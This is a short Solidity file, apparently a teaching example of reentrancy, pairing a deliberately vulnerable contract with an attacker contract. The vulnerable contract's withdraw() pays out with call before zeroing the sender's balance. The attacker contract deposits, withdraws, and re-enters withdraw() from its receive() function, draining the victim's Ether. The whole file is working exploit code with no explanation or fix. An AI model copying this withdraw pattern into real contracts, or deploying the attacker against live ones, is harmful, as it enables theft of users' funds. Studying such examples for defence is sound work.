// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract single_function_reentrancy {
    mapping(address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

	function withdraw() public {
        uint256 amount = balances[msg.sender];
        msg.sender.call{value: amount}("");
        balances[msg.sender] = 0;
	}
}


contract attack_single_function_reentrancy {
    single_function_reentrancy victim;
    uint256 amount = 1 ether;

    constructor(single_function_reentrancy _victim) {
        victim = single_function_reentrancy(_victim);
    }

    function attack() public payable {
        victim.deposit{value: msg.value}();
        if (address(victim).balance >= amount) {
            victim.withdraw();
        }
    }



    receive() external payable {
        if (address(victim).balance >= amount) {
            victim.withdraw();
        }
    }

  
}